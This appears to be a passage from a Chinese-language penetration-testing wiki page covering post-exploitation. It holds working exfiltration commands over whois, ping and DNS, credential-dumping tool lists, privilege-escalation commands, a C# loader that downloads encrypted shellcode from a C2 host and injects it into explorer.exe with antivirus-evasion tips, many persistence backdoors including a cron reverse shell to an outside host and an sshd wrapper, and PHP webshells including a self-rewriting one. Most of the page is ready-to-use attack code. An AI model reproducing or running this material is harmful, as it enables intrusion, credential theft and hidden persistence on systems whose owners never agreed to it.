nc -vlnp 1337 | sed "s/ //g" | base64 -d 
```

发送端 Host A：

```text
whois -h host_ip -p 1337 `cat /etc/passwd | base64`
```

[WHOIS + TAR](https://twitter.com/mubix/status/1102780436118409216) First:

```text
ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it
```

Next

```text
tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits
```

Finally

```text
cat files.b64 | tr -d '\r\n' | base64 -d | tar zxv #to get the files out
```

PING 发送端:

```text
xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
```

接收端`ping_receiver.py`:

```python
import sys

try:
    from scapy.all import *
except:
    print("Scapy not found, please install scapy: pip install scapy")
    sys.exit(0)


def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 8:
            data = pkt[ICMP].load[-4:]
            print(f'{data.decode("utf-8")}', flush=True, end="", sep="")

sniff(iface="eth0", prn=process_packet)
```

```text
python3 ping_receiver.py
```

DIG 发送端:

```text
xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done
```

接收端`dns_reciver.py`:

```python
try:
    from scapy.all import *
except:
    print("Scapy not found, please install scapy: pip install scapy")

def process_packet(pkt):
    if pkt.haslayer(DNS):
        domain = pkt[DNS][DNSQR].qname.decode('utf-8')
        root_domain = domain.split('.')[1]
        if root_domain.startswith('gooogle'):
            print(f'{bytearray.fromhex(domain[:-13]).decode("utf-8")}', flush=True, end='')

sniff(iface="eth0", prn=process_packet)
```

```text
python3 dns_reciver.py
```

...

### 搭建 HTTP server

python2

```text
python -m SimpleHTTPServer 1337
```

python3

```text
python -m http.server 1337
```

PHP 5.4+

```text
php -S 0.0.0.0:1337
```

ruby

```text
ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd).start'
```

```text
ruby -run -e httpd . -p 1337
```

Perl

```text
perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount("/"=>{path=>"."}); $s->start'
```

```text
perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0] < io(-x $1 +? "./$1 |" : $1) if /^GET \/(.*) / })'
```

busybox httpd

```text
busybox httpd -f -p 8000
```

## 内网信息搜集

### 本机信息搜集

**1、用户列表**

windows用户列表 分析邮件用户，内网\[域\]邮件用户，通常就是内网\[域\]用户

**2、进程列表**

析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等

**3、服务列表**

与安全防范工具有关服务\[判断是否可以手动开关等\] 存在问题的服务\[权限/漏洞\]

**4、端口列表**

开放端口对应的常见服务/应用程序\[匿名/权限/漏洞等\] 利用端口进行信息收集

**5、补丁列表**

分析 Windows 补丁 第三方软件\[Java/Oracle/Flash 等\]漏洞

**6、本机共享**

本机共享列表/访问权限 本机访问的域共享/访问权限

**7、本用户习惯分析**

历史记录 收藏夹 文档等

**8、获取当前用户密码工具**

**Windows**

* [mimikatz](https://github.com/gentilkiwi/mimikatz)
* [wce](https://github.com/vergl4s/pentesting-dump/tree/master/net/Windows/wce_v1_42beta_x64)
* [Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump)
* [mimiDbg](https://github.com/giMini/mimiDbg)
* [LaZagne](https://github.com/AlessandroZ/LaZagne)
* [nirsoft\_package](http://launcher.nirsoft.net/downloads/)
* [QuarksPwDump](https://github.com/quarkslab/quarkspwdump) [fgdump](https://github.com/mcandre/fgdump)
* 星号查看器等

**Linux**

* [LaZagne](https://github.com/AlessandroZ/LaZagne)
* [mimipenguin](https://github.com/huntergregal/mimipenguin)

### 扩散信息收集

**端口扫描**

**常用端口扫描工具**

* [nmap](https://nmap.org/)
* [masscan](https://github.com/robertdavidgraham/masscan)
* [zmap](https://github.com/zmap/zmap)
* s扫描器
* 自写脚本等
* NC
* ...

**内网拓扑架构分析**

* DMZ
* 管理网
* 生产网
* 测试网

**常见信息收集命令**

ipconfig:

```text
ipconfig /all ------> 查询本机 IP 段，所在域等
```

net:

```text
net user ------> 本机用户列表
net localgroup administrators ------> 本机管理员[通常含有域用户]
net user /domain ------> 查询域用户
net group /domain ------> 查询域里面的工作组
net group "domain admins" /domain ------> 查询域管理员用户组
net localgroup administrators /domain ------> 登录本机的域管理员
net localgroup administrators workgroup\user001 /add ----->域用户添加到本机 net group "Domain controllers" -------> 查看域控制器(如果有多台)
net view ------> 查询同一域内机器列表 net view /domain ------> 查询域列表
net view /domain:domainname
```

dsquery

```text
dsquery computer domainroot -limit 65535 && net group "domain
computers" /domain ------> 列出该域内所有机器名
dsquery user domainroot -limit 65535 && net user /domain------>列出该域内所有用户名
dsquery subnet ------>列出该域内网段划分
dsquery group && net group /domain ------>列出该域内分组 
dsquery ou ------>列出该域内组织单位 
dsquery server && net time /domain------>列出该域内域控制器 
```

### 第三方信息收集

* NETBIOS 信息收集
* SMB 信息收集
* 空会话信息收集
* 漏洞信息收集等

## 权限提升

### Windows

**BypassUAC**

**常用方法**

* 使用IFileOperation COM接口
* 使用Wusa.exe的extract选项
* 远程注入SHELLCODE 到傀儡进程
* DLL劫持，劫持系统的DLL文件
* eventvwr.exe and registry hijacking
* sdclt.exe
* SilentCleanup
* wscript.exe
* cmstp.exe
* 修改环境变量，劫持高权限.Net程序
* 修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序
* 直接提权过UAC

**常用工具**

* [UACME](https://github.com/hfiref0x/UACME)
* [Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
* [Yamabiko](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko)
* ...

**提权**

* windows内核漏洞提权

> 检测类:[Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester),[WinSystemHelper](https://github.com/brianwrf/WinSystemHelper),[wesng](https://github.com/bitsadmin/wesng)

> 利用类:[windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)，[BeRoot](https://github.com/AlessandroZ/BeRoot.git)

* 服务提权

> 数据库服务，ftp服务等

* WINDOWS错误系统配置
* 系统服务的错误权限配置漏洞
* 不安全的注册表权限配置
* 不安全的文件/文件夹权限配置
* 计划任务
* 任意用户以NT AUTHORITY\SYSTEM权限安装msi
* 提权脚本

> [PowerUP](https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1),[ElevateKit](https://github.com/rsmudge/ElevateKit)

### Linux

**内核溢出提权**

[linux-kernel-exploits](https://github.com/SecWiki/linux-kernel-exploits)

**计划任务**

```text
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

**SUID**

```text
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

**系统服务的错误权限配置漏洞**

```text
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```

**不安全的文件/文件夹权限配置**

```text
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

**找存储的明文用户名，密码**

```text
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla
```

## 权限维持

### C&C免杀对抗多维度分析

**查杀方式**

> 文件查杀（Signatured Static Scanning） 内存扫描（Run-time Analysis） 流量分析（NIPS/NIDS） 行为分析（behavior Monitoring）

**对抗-静态扫描（文件查杀）**

1、shellcode加密（XOR、AES）

避免被杀软直接获取到真正shellcode（因为性能等原因 杀软不会暴力枚举解密内容）

2、源码级免杀（自主研发C&C工具）

**对抗-内存扫描**

各种语言自定义加载器，比如使用C\# 编写ShellCode Loader

运行机制不同（C\#使用虚拟机解释后运行，Golang编译运行）杀软没足够精力跟进各种形式的加载器

**对抗-流量分析**

域前置 - Domain Fronting

 流量路径`CDN->IP->c2`

**对抗-行为分析**

指定特定的运行条件，符合条件才执行恶意操作；避免在沙箱、逆向分析时有明显的恶意行为。

适合指定某个重要目标的情况下使用，比如要拿域内的某台重要靶标。

或者可以加强壳，例如VMP

#### 一、shellcode加密

推荐一个脚本：[https://github.com/rvrsh3ll/CPLResourceRunner](https://github.com/rvrsh3ll/CPLResourceRunner)

可以把CS生成的RAW的beacon.bin转成shellcode

```text
python2 ConvertShellcode.py beacon.bin
```

**服务端：Python Flask动态加密Shellcode**

```python
#服务端起个Flask动态加密，__init__.py
#coding=utf-8
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from flask import Flask

def add_to_32(key):
    while len(key) % 32 != 0:
        key += '\0'
    return str.encode(key)  # 返回bytes,密钥不是32位就不全

def create_app():
    # create and configure the app
    app = Flask(__name__, instance_relative_config=True)
    @app.route('/<string:key>', methods=('GET', 'POST'))
    def AES_Encrypt(key):
        BLOCK_SIZE = 32  # Bytes
        f = open('./shellcode.txt', 'r')	#从CS导出的C#格式的shellcode，放在Fask应用根目录
        shellcode = f.read()
        cipher = AES.new(add_to_32(key), AES.MODE_ECB)
        encrypted = cipher.encrypt(pad(shellcode.encode('utf-8'),BLOCK_SIZE))
        encrypted_text = str(base64.encodebytes(encrypted), encoding='utf-8')
        #加密结果用base64编码
        return encrypted_text
    return app
```

#### 二、C\#编写Loader

**客户端：Loder从网络加载Shellcode（随机生成key去请求shellcode） -&gt; 解密 -&gt; 创建进程 运行上线**

```c
//WLoader C#
using System;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;

namespace Wloader
{
    class Program
    {
        // Used to Load Shellcode into Memory:
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll")] //声明API函数
        public static extern int VirtualAllocEx(
            IntPtr hProcess, //进程的句柄.该函数在此进程的虚拟地址空间内分配内存
            int lpAddress,//该指针为要分配的页面区域指定所需的起始地址
            UInt32 dwSize,//要分配的内存区域的大小，以字节为单位
            UInt32 flAllocationType,//内存分配的类型 ,MEM_COMMIT为指定的保留内存页面分配内存
            UInt32 flProtect);//对要分配的页面区域的内存保护,PAGE_EXECUTE_READWRITE
        //该地址必须是页面属性为PAGE_EXECUTE_READWRITE的页面）或者其他宿主进程能执行地方（如共享内存映射区）

        [DllImport("kernel32.dll")]
        public static extern int WriteProcessMemory(
            IntPtr hProcess,    //要修改的过程存储器的句柄
            int lpBaseAddress, //指向要写入数据的指定进程中的基地址的指针
            byte[] lpBuffer, //指向缓冲区的指针，该缓冲区包含要在指定进程的地址空间中写入的数据
            int nSize,//要写入指定进程的字节数 
            int lpNumberOfBytesWritten);//指向变量的指针，该变量接收传输到指定进程中的字节数;(可选)为NULL则忽略

        [DllImport("kernel32.dll")]
        public static extern int GetProcAddress(int hwnd, string lpname);

        [DllImport("kernel32.dll")]
        public static extern int GetModuleHandleA(string name);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,//目标进程的句柄
            UInt32 lpThreadAttributes, //指向线程的安全描述结构体的指针，一般设置为NULL，表示默认安全级别
            UInt32 dwStackSize,//线程堆栈大小，一般设置为0，表示使用默认大小
            UInt32 lpStartAddress,//线程函数的地址
            IntPtr lpParameter,//线程参数
            UInt32 dwCreationFlags,//线程的创建方式，CREATE_SUSPENDED 线程以挂起方式创建
            ref UInt32 lpThreadId); //输出参数，记录创建的远程线程的ID
        

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
        );

        public static string key;



        //随机生成32位密钥
        public static void NewKey()
        {
            key = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 32);
        }
        //请求获取shellcode内容
        public static string GetShell(string url)
        {
            url = url + key;
            HttpWebRequest reqContent = (HttpWebRequest)WebRequest.Create(url);//这个是请求的登录接口
            reqContent.Method = "GET";
            reqContent.AllowAutoRedirect = true;//服务端重定向。一般设置false
            reqContent.Timeout = 5000;
            HttpWebResponse respContent = (HttpWebResponse)reqContent.GetResponse();
            StreamReader sr = new StreamReader(respContent.GetResponseStream());
            return sr.ReadToEnd();

        }

        //AES解密
        public static string AesDecrypt(string message, string key)
        {
            using (AesCryptoServiceProvider aesProvider = new AesCryptoServiceProvider())
            {
                aesProvider.Key = Encoding.UTF8.GetBytes(key);
                aesProvider.Mode = CipherMode.ECB;
                aesProvider.Padding = PaddingMode.None;
                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())
                {
                    byte[] inputBuffers = Convert.FromBase64String(message);
                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);
                    aesProvider.Clear();
                    string rs = Encoding.UTF8.GetString(results);
                    rs = rs.Replace("", null);
                    rs = rs.Replace("", null);
                    rs = rs.Replace(" ", null);
                    return rs;
                }
            }
        }
       
    public static void runShell(string shellcodes)
        {
            string[] strings = shellcodes.Split(',');
            byte[] shellcode = new byte[strings.Length];
            //逐个字符变为16进制字节数据
            for (int i = 0; i < strings.Length; i++)
            {
                shellcode[i] = Convert.ToByte(strings[i], 16);
            }
            Console.WriteLine(strings.Length);
            try
            {

                Process[] pname = Process.GetProcesses(); //取得所有进程
                foreach (Process name in pname)
                {
                    if (name.ProcessName.ToLower().IndexOf("explorer") != -1)//注入到资源管理器中
                    {
                        IntPtr hThread = IntPtr.Zero;
                        UInt32 threadId = 0;
                        IntPtr pinfo = IntPtr.Zero;

                        UInt32 funcAddr = (uint)VirtualAllocEx(name.Handle, 0, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                        //在宿主进程中申请一块存储区域

                        WriteProcessMemory(name.Handle, (int)funcAddr, shellcode, shellcode.Length, 0);
                        //通过WriteProcessMemory函数将线程代码写入宿主进程中（替换上边的）

                        /*threadId = GetProcAddress(GetModuleHandleA("Kernel32"), "LoadLibraryA");*/
                        //取得loadlibrary在kernek32.dll地址

                        hThread = CreateRemoteThread(name.Handle, 0, 0, funcAddr, pinfo, 0, ref threadId);
                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                        Console.WriteLine("执行完毕，Success");
                    }
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("exception: " + e.Message);
            }
        }
        static void Main(string[] args)
        {
            NewKey();//生成32位的密钥key
            string shellcode = GetShell("http://192.168.1.103:5000/");//从HTTP服务器获取加密的Shellcode
            shellcode = AesDecrypt(shellcode, key);//这里就得到了动态加解密后的shellcode
            //Console.WriteLine(shellcode);//输出测试

            //接下来注入到进程
            runShell(shellcode);
        }
    }
}
```

**成功上线**

![](https://wiki.wgpsec.org/images/ss.png)

**杀软扫描**

![](https://wiki.wgpsec.org/images/image-20200725203712920.png)

![](https://wiki.wgpsec.org/images/image-20200725204100044.png)

![](https://wiki.wgpsec.org/images/image-20200725204247935.png)

**最后注意！！！**

我写代码的时候机器开着火绒呢，一开始我用的CreateThread直接给我干掉了;

后来改成CreateRemoteThread，火绒还是能识别出木马释放程序；

解决方法：1、再找其它可以替代的函数； 2、寻找新的注入方式

还有就是我这次做实验的时候太奔放了，全程开着杀软网没断；

正确的做法是更新完杀软然后断网，创建虚拟机快照，测完后恢复快照；

否则杀软会镜像流量，等下次开机样本就会被上传出去。

> 这个加载器运行时会弹一个黑框输出shellcode的长度，实际使用记得修改为不让它弹窗

#### 三、使用域前置

由于是测试，跳过了这一步，直接用了C2的IP

域前置方法参考以下链接：

[https://www.anquanke.com/post/id/195011](https://www.anquanke.com/post/id/195011)

> 另外CS的Profie也要自己修改一下特征

### 系统后门

**Windows**

**1、密码记录工具**

WinlogonHack WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。 键盘记录器 安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。 NTPass 获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。 Linux 下 openssh 后门 重新编译运行的sshd服务，用于记录用户的登陆密码。

**2、常用的存储Payload位置**

**WMI** : 存储：

```text
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_Command'
$StaticClass.Put()
$StaticClass.Properties.Add('Command' , $Payload)
$StaticClass.Put() 
```

读取:

```text
$Payload=([WmiClass] 'Win32_Command').Properties['Command'].Value
```

**包含数字签名的PE文件** 利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名 **特殊ADS** …

```text
type putty.exe > ...:putty.exe
wmic process call create c:\test\ads\...:putty.exe
```

特殊COM文件

```text
type putty.exe > \\.\C:\test\ads\COM1:putty.exe
wmic process call create \\.\C:\test\ads\COM1:putty.exe
```

磁盘根目录

```text
type putty.exe >C:\:putty.exe 
wmic process call create C:\:putty.exe
```

**3、Run/RunOnce Keys**

用户级

```text
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

管理员

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
```

**4、BootExecute Key**

由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：

```text
HKLM\SYSTEM\CurrentControlSet\Control\hivelist
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager
```

**5、Userinit Key**

WinLogon进程加载的login scripts,具体键值：

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

**6、Startup Keys**

```text
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
```

**7、Services**

创建服务

```text
sc create [ServerName] binPath= BinaryPathName
```

**8、Browser Helper Objects**

本质上是Internet Explorer启动时加载的DLL模块

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects
```

**9、AppInit\_DLLs**

加载User32.dll会加载的DLL

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
```

**10、文件关联**

```text
HKEY_LOCAL_MACHINE\Software\Classes
HKEY_CLASSES_ROOT
```

**11、bitsadmin**

```text
bitsadmin /create backdoor
bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe
bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://host.com/calc.sct scrobj.dll"
bitsadmin /Resume backdoor
```

**12、mof**

```text
pragma namespace("\\\\.\\root\\subscription") 
instance of __EventFilter as $EventFilter
{
EventNamespace = "Root\\Cimv2";
Name = "filtP1";
Query = "Select * From __InstanceModificationEvent "
"Where TargetInstance Isa \"Win32_LocalTime\" "
"And TargetInstance.Second = 1";
QueryLanguage = "WQL";
}; 
instance of ActiveScriptEventConsumer as $Consumer
{
Name = "consP1";
ScriptingEngine = "JScript";
ScriptText = "GetObject(\"script:https://host.com/test\")";
}; 
instance of __FilterToConsumerBinding
{
Consumer = $Consumer;
Filter = $EventFilter;
};
```

管理员执行：

```text
mofcomp test.mof
```

**13、wmi**

每隔60秒执行一次notepad.exe

```text
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="C:\Windows\System32\notepad.exe",CommandLineTemplate="C:\Windows\System32\notepad.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""
```

**14、Userland Persistence With Scheduled Tasks**

劫持计划任务UserTask，在系统启动时加载dll

```text
function Invoke-ScheduledTaskComHandlerUserTask
{
[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
Param (
[Parameter(Mandatory = $True)]
[ValidateNotNullOrEmpty()]
[String]
$Command,

[Switch]
$Force
)
$ScheduledTaskCommandPath = "HKCU:\Software\Classes\CLSID\{58fb76b9-ac85-4e55-ac04-427593b1d060}\InprocServer32"
if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
New-Item $ScheduledTaskCommandPath -Force |
New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
}else{
Write-Verbose "Key already exists, consider using -Force"
exit
}

if (Test-Path $ScheduledTaskCommandPath) {
Write-Verbose "Created registry entries to hijack the UserTask"
}else{
Write-Warning "Failed to create registry key, exiting"
exit
} 
}
Invoke-ScheduledTaskComHandlerUserTask -Command "C:\test\testmsg.dll" -Verbose
```

**15、Netsh**

```text
netsh add helper c:\test\netshtest.dll
```

后门触发：每次调用netsh

> dll编写:[https://github.com/outflanknl/NetshHelperBeacon](https://github.com/outflanknl/NetshHelperBeacon)

**16、Shim**

常用方式： InjectDll RedirectShortcut RedirectEXE

**17、DLL劫持**

通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程 使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行 工具：[https://github.com/sensepost/rattler](https://github.com/sensepost/rattler) 工具：[https://github.com/Yonsm/AheadLib](https://github.com/Yonsm/AheadLib)

**18、DoubleAgent**

编写自定义Verifier provider DLL 通过Application Verifier进行安装 注入到目标进程执行payload 每当目标进程启动，均会执行payload，相当于一个自启动的方式 POC : [https://github.com/Cybellum/DoubleAgent](https://github.com/Cybellum/DoubleAgent)

**19、waitfor.exe**

不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe POC : [https://github.com/3gstudent/Waitfor-Persistence](https://github.com/3gstudent/Waitfor-Persistence)

**20、AppDomainManager**

针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制

**21、Office**

[劫持Office软件的特定功能](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/):通过dll劫持,在Office软件执行特定功能时触发后门 [利用VSTO实现的office后门](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8/) [Office加载项](https://github.com/3gstudent/Office-Persistence)

* Word WLL
* Excel XLL
* Excel VBA add-ins
* PowerPoint VBA add-ins

> 参考1 ：[https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/](https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/)

> 参考2 ：[https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/](https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/)

**22、CLR**

无需管理员权限的后门，并能够劫持所有.Net程序 POC:[https://github.com/3gstudent/CLR-Injection](https://github.com/3gstudent/CLR-Injection)

**23、msdtc**

利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测 利用：向 %windir%\system32\目录添加dll并重命名为oci.dll

**24、Hijack CAccPropServicesClass and MMDeviceEnumerato**

利用COM组件，不需要重启系统，不需要管理员权限 通过修改注册表实现 POC：[https://github.com/3gstudent/COM-Object-hijacking](https://github.com/3gstudent/COM-Object-hijacking)

**25、Hijack explorer.exe**

COM组件劫持，不需要重启系统，不需要管理员权限 通过修改注册表实现

```text
HKCU\Software\Classes\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}
HKCU\Software\Classes\CLSID{fbeb8a05-beee-4442-804e-409d6c4515e9}
HKCU\Software\Classes\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}
HKCU\Software\Classes\Wow6432Node\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}
```

**26、Windows FAX DLL Injection**

通过DLL劫持，劫持Explorer.exe对`fxsst.dll`的加载 Explorer.exe在启动时会加载`c:\Windows\System32\fxsst.dll`\(服务默认开启，用于传真服务\)将payload.dll保存在`c:\Windows\fxsst.dll`，能够实现dll劫持，劫持Explorer.exe对`fxsst.dll`的加载

**27、特殊注册表键值**

在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取\(使用Win32 API\)，但系统能够执行\(使用Native API\)。

[《渗透技巧——"隐藏"注册表的创建》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA/)

[《渗透技巧——"隐藏"注册表的更多测试》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95/)

**28、快捷方式后门**

替换我的电脑快捷方式启动参数 POC : [https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK\_backdoor.ps1](https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1)

**29、Logon Scripts**

```text
New-ItemProperty "HKCU:\Environment\" UserInitMprLogonScript -value "c:\test\11.bat" -propertyType string | Out-Null
```

**30、Password Filter DLL**

**31、利用BHO实现IE浏览器劫持**

**Linux**

**crontab**

每60分钟反弹一次shell给dns.wuyun.org的53端口

```text
#!bash
(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/dns.wuyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
```

**硬链接sshd**

```text
#!bash
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;
```

链接：ssh root@192.168.206.142 -p 2333

**SSH Server wrapper**

```text
#!bash
cd /usr/sbin
mv sshd ../bin
echo '#!/usr/bin/perl' >sshd
echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd
//不用重启也行
/etc/init.d/sshd restart
```

```text
socat STDIO TCP4:192.168.206.142:22,sourceport=13377
```

**SSH keylogger**

vim当前用户下的.bashrc文件,末尾添加

```text
#!bash
alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'
```

source .bashrc

**Cymothoa\_进程注入backdoor**

```text
./cymothoa -p 2270 -s 1 -y 7777
```

```text
nc -vv ip 7777
```

**rootkit**

* [openssh\_rootkit](http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz)
* [Kbeast\_rootkit](http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz)
* Mafix + Suterusu rootkit

**Tools**

* [Vegile](https://github.com/Screetsec/Vegile)
* [backdoor](https://github.com/icco/backdoor)

### WEB后门

PHP Meterpreter后门 Aspx Meterpreter后门 weevely webacoo  
 ....

#### PHP

**文件免杀（Apache、Nginx特性）**cmd

```php
<? assert(implode(reset(get_defined_vars())));	//返回由所有已定义变量所组成的数组    
Use age：cmd.php?a=system(whoami);
适用于PHP < 7.1 ，因为在PHP7.1之后assert被弃用了、7.2 create_function被弃用了
```

一句话

```php
<? @eval(false ? 1 : $_POST[1]);
```

**流量免杀**

蚁剑自定义编码器 [https://github.com/AntSwordProject/AwesomeEncoder/tree/master/php](https://github.com/AntSwordProject/AwesomeEncoder/tree/master/php)

**内存马**

```php
//nodie_shell.php
<?php
	set_time_limit(0);			//设置脚本最大执行时间,0 即为无时间限制
	ignore_user_abort(true);	//设置与客户机断开不终止脚本的执行
	unlink(__FILE__);			//删除文件自身
	$file = '/var/www/html/.shell.php';	
	$code = '<?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8"){@system($_POST[a]);}?>';
	while (1) {
		file_put_contents($file, $code);	//写shell文件
		system('touch -m -d "2014-10-31 13:50:11" .shell.php');		//修改时间戳
		usleep(1000);			//以指定的微秒数延缓程序的执行
	}
?>
```

**杀死PHP不死马**

```text
1、高权限，重启服务
service apache2 restart
service php restart

2、低权限，杀掉所有进程
